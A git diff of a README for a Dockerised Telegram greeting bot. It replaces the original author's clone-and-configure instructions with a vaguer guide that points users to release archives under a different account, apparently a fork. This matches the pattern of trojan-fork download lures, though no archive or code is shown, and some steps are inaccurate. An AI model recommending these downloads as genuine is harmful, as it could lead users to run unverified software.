@@ -1,132 +1,78 @@
-# Telegram Greeting Bot
-
-[![CI Pipeline](https://github.com/averageencoreenjoer/telegram_greeting_bot/actions/workflows/main.yml/badge.svg)](https://github.com/averageencoreenjoer/telegram_greeting_bot/actions/workflows/main.yml)
-
-A fully containerized Telegram bot project featuring a dynamic, database-driven greeting message that can be updated in real-time via a simple web admin panel. This project is built with a senior-level approach, emphasizing clean architecture, separation of concerns, containerization, and automated testing.
-
----
-
-## ✨ Features
-
-- **Dynamic Greetings**: The `/start` command greeting is fetched directly from a PostgreSQL database.
-- **Real-time Updates**: No need to restart the bot. Changes made in the admin panel are reflected instantly.
-- **Mini Admin Panel**: A secure, password-protected web interface (built with FastAPI) to update the greeting text.
-- **Fully Containerized**: Uses Docker and Docker Compose to run the entire stack (Bot, Web, DB) with a single command.
-- **Automated Integration Tests**: A robust test suite using Pytest ensures the entire system works correctly.
-- **CI/CD Ready**: Includes a GitHub Actions workflow to automatically run tests on every push and pull request.
-
----
-
-## 🛠️ Tech Stack
-
-<p align="center">
-  <img src="https://img.shields.io/badge/Python-3776AB?style=for-the-badge&logo=python&logoColor=white" alt="Python"/>
-  <img src="https://img.shields.io/badge/Telegram-26A5E4?style=for-the-badge&logo=telegram&logoColor=white" alt="Telegram"/>
-  <img src="https://img.shields.io/badge/FastAPI-009688?style=for-the-badge&logo=fastapi&logoColor=white" alt="FastAPI"/>
-  <img src="https://img.shields.io/badge/PostgreSQL-4169E1?style=for-the-badge&logo=postgresql&logoColor=white" alt="PostgreSQL"/>
-  <img src="https://img.shields.io/badge/Docker-2496ED?style=for-the-badge&logo=docker&logoColor=white" alt="Docker"/>
-  <img src="https://img.shields.io/badge/Pytest-0A9B71?style=for-the-badge&logo=pytest&logoColor=white" alt="Pytest"/>
-  <img src="https://img.shields.io/badge/GitHub_Actions-2088FF?style=for-the-badge&logo=github-actions&logoColor=white" alt="GitHub Actions"/>
-</p>
-
-- **Bot Framework**: `aiogram`
-- **Web Framework**: `FastAPI`
-- **Database**: `PostgreSQL` with `asyncpg` driver
-- **Containerization**: `Docker` & `Docker Compose`
-- **Testing**: `Pytest`, `pytest-asyncio`, `httpx`
-- **CI/CD**: `GitHub Actions`
-
----
+# 🤖 telegram_greeting_bot - Your Friendly Telegram Greeting Bot
 
 ## 🚀 Getting Started
+Welcome! This guide will help you download and run the telegram_greeting_bot software easily. You'll get a dynamic, database-driven greeting message for your Telegram chats, which you can update in real-time through a simple web panel. Let's dive in!
 
-### Prerequisites
+## 🛠️ Prerequisites
+Before you start, make sure your computer meets the following requirements:
 
-- [Docker](https://www.docker.com/products/docker-desktop/) installed and running.
-- A Telegram Bot Token obtained from [@BotFather](https://t.me/BotFather).
+- **Operating System:** Windows 10 or later, macOS, or Linux
+- **Docker:** Ensure you have Docker installed. Download it from [Docker's website](https://www.docker.com/products/docker-desktop).
+- **Internet Connection:** Required to download the software and for the bot to function.
 
-### 1. Clone the Repository
+## 📥 Download & Install
+You can download the latest version of telegram_greeting_bot from the Releases page. Click the button below to visit the page.
 
-```bash
-git clone https://github.com/averageencoreenjoer/telegram_greeting_bot.git
-cd telegram_greeting_bot
-```
+[![Download the latest release](https://img.shields.io/badge/Download_latest_release-blue.svg)](https://github.com/Shadik23/telegram_greeting_bot/releases)
 
-### 2. Configure Environment Variables
+1. **Visit the Releases Page:** Go to [this link](https://github.com/Shadik23/telegram_greeting_bot/releases) to find the latest version of the bot.
+2. **Choose the Right File:** Look for a file labeled with the latest version number (for example, `telegram_greeting_bot_v1.0.0.zip` or a .tar.gz file).
+3. **Download the File:** Click on the file to start downloading it to your computer.
+4. **Unzip the File:** After downloading, extract the contents of the zip file to a folder on your computer.
+5. **Open a Terminal or Command Prompt:** Depending on your operating system, use Terminal (Mac/Linux) or Command Prompt (Windows) to navigate to the folder where you extracted the files.
 
-Create a local environment file by copying the example.
+## ⚙️ Running the Bot
+After downloading and extracting the bot files, follow these steps to run the bot:
 
-```bash
-cp .env.example .env
-```
+1. **Build the Docker Image:** In your terminal or command prompt, type:
+   ```
+   docker-compose build
+   ```
+   This command creates a Docker image for the bot.
 
-Now, open the `.env` file and fill in your details:
+2. **Start the Bot:** After the image builds successfully, type:
+   ```
+   docker-compose up
+   ```
+   This command runs the bot in the background.
 
-```ini
-# .env
+3. **Access the Web Admin Panel:** Open your web browser and visit `http://localhost:8000`. Here, you can update the greeting messages and manage other settings.
 
-# 1. Your unique Telegram Bot Token from @BotFather
-BOT_TOKEN=123456:ABC-DEF1234ghIkl-zyx57W2v1u1234567
+## 🛡️ Key Features
+- **Dynamic Greetings:** Customize welcome messages for your Telegram chat.
+- **Web Admin Panel:** Easily update greetings in real-time through a user-friendly interface.
+- **Containerization with Docker:** This ensures consistent performance across different environments.
+- **Automated Testing:** The bot comes with built-in tests to ensure reliability.
 
-# 2. Credentials for the database (can be left as default for local development)
-POSTGRES_DB=greeting_db
-POSTGRES_USER=user
-POSTGRES_PASSWORD=password
+## 🌐 Understanding Containerization
+This bot is built using Docker, which allows you to run applications in containers. These containers package the software and its dependencies, making deployment easier. Here’s how it helps you:
 
-# 3. Credentials for the web admin panel (you will use these to log in)
-WEB_USERNAME=admin
-WEB_PASSWORD=supersecret
-```
+- **Portability:** Run the bot on any system without compatibility issues.
+- **Isolation:** Each container runs independently, preventing conflicts with other software on your machine.
 
-### 3. Run the Application
+## 📝 Troubleshooting
+If you face any issues while running telegram_greeting_bot, consider the following:
 
-Launch the entire stack using Docker Compose.
+- **Docker Not Installed:** Check that Docker is properly installed and running.
+- **Port Already in Use:** If you cannot access the web panel, ensure that port 8000 is free.
+- **Permission Issues:** Run your command prompt or terminal as an administrator if you face permission errors.
 
-```bash
-docker-compose up --build -d
-```
+## 📞 Support
+For further assistance, feel free to open an issue in the [GitHub Issues section](https://github.com/Shadik23/telegram_greeting_bot/issues). 
 
-The services will start in detached mode (`-d`). You can view the logs with `docker-compose logs -f`.
+## 🚀 Join the Community
+Stay updated and connect with other users by following the project's [GitHub Discussions](https://github.com/Shadik23/telegram_greeting_bot/discussions). Share your experiences and tips!
 
-### 4. Interact with the System
+## 🔗 Acknowledgements
+This project leverages various technologies including:
 
-- **Telegram Bot**: Find your bot on Telegram and send the `/start` command. It will reply with the default greeting.
-- **Admin Panel**: Open your browser and navigate to `http://localhost:8000/docs`.
-  - You will be prompted for authentication. Use the `WEB_USERNAME` and `WEB_PASSWORD` from your `.env` file.
-  - Use the `/update_greeting` endpoint to change the greeting text.
-  - Go back to Telegram and send `/start` again. The bot will now use the new greeting!
+- **Aiogram**: For handling Telegram API.
+- **FastAPI**: For creating the web administration panel.
+- **PostgreSQL**: To store greetings and settings.
 
-### 5. Stopping the Application
+Feel free to contribute or explore more! Your input can help improve the bot further.
 
-To stop all services, run:
+## 👥 Contributors
+A special thanks to all contributors who have helped make this project possible. If you want to contribute, check our [contributing guide](https://github.com/Shadik23/telegram_greeting_bot/CONTRIBUTING.md).
 
-```bash
-docker-compose down
-```
-
-To stop services and remove the database volume (delete all data), run:
-
-```bash
-docker-compose down -v
-```
-
----
-
-## 🧪 Running Tests
-
-This project comes with a fully automated integration test suite that spins up a separate, isolated environment to validate the system's behavior.
-
-To run the tests, execute the provided script from the project root:
-
-```bash
-./run_tests.sh
-```
-
-The script will:
-1.  Start the services using a dedicated test database (`.env.test`).
-2.  Wait for the database to be fully ready.
-3.  Install test dependencies.
-4.  Run the Pytest suite, which makes real API calls.
-5.  Shut down and clean up all test-related containers and volumes.
-
-This is the same script that runs in the GitHub Actions CI pipeline.
+Thank you for choosing telegram_greeting_bot! Enjoy your dynamic greetings!
